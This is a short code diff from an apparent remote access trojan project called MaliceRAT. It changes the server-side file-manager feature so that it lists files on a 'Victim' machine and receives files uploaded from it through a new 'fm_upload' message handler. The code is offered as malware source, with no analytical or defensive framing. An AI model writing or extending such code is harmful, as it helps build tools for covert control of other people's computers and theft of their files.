@@ -6,6 +6,7 @@ namespace MaliceRAT.RatServer.Features
     {
         #region Events
         public event Action<Victim, string> FilesAndFoldersReceived;
+        public event Action<Victim, string, string> FileUploaded;
         #endregion
 
         #region Variables
@@ -22,10 +23,16 @@ namespace MaliceRAT.RatServer.Features
 
         private void OnMessageReceived(Victim victim, dynamic message)
         {
-            if (message["type"] == "files_and_folders")
+            if (message["type"] == "fm_list")
             {
                 string filesAndFoldersJson = message["filesAndFolders"];
                 FilesAndFoldersReceived?.Invoke(victim, filesAndFoldersJson);
+            }
+            else if (message["type"] == "fm_upload")
+            {
+                string name = message["name"];
+                string data = message["data"];
+                FileUploaded?.Invoke(victim, name, data);
             }
         }
     }
